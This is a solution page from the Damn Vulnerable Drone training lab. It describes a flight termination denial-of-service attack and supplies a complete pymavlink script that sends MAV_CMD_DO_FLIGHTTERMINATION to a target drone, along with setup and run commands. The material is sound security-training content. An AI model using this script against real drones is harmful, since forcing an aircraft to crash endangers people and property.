<i>Forcefully terminate the drone's flight.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Denial of Service > Flight Termination Attack

# Description

The Flight Termination attack involves sending a MAVLink command to the drone instructing it to immediately halt its current operation. This typically results in an abrupt landing, loss of control, or crash. It exploits the `MAV_CMD_DO_FLIGHTTERMINATION` command available in most MAVLink-enabled autopilot stacks.

# Resources

- <a href="https://mavlink.io/en/">MAVLink Protocol</a>  
- <a href="https://mavlink.io/en/messages/common.html#mav_commands">MAVLink Commands</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Step 1. Setup</h3>
<pre><code class="code mb-3 mt-3">sudo apt-get update
sudo apt-get install python3 python3-pip
pip3 install pymavlink
</code></pre>

---

<h3>Step 2. Create the Script</h3>
<p>Save the following code as <code>flight_termination.py</code>:</p>

<pre><code class="code mb-3 mt-3">from pymavlink import mavutil
import sys

def connect_drone(target_ip, target_port):
    master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
    master.wait_heartbeat()
    print("Connected to the drone.")
    return master

def execute_flight_termination(master):
    master.mav.command_long_send(
        master.target_system,
        master.target_component,
        mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION,
        0,
        1, 0, 0, 0, 0, 0, 0
    )
    print("Flight termination command sent.")

def main(target_ip, target_port):
    master = connect_drone(target_ip, target_port)
    execute_flight_termination(master)

    while True:
        msg = master.recv_match(blocking=True)
        if not msg:
            continue
        print(f"Received message: {msg}")
        if msg.get_type() == 'COMMAND_ACK':
            if msg.command == mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION:
                if msg.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
                    print("Flight termination command accepted.")
                else:
                    print(f"Flight termination failed: {msg.result}")
            break

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python flight_termination.py &lt;target_ip:target_port&gt;")
        sys.exit(1)

    target_ip, target_port = sys.argv[1].split(':')
    target_port = int(target_port)
    main(target_ip, target_port)
</code></pre>

---

<h3>Step 3. Run the Script</h3>
<pre><code class="code mb-3 mt-3">sudo python3 flight_termination.py 10.13.0.3:5760</code></pre>

<p>Replace the IP and port with your actual drone connection details.</p>

</details>
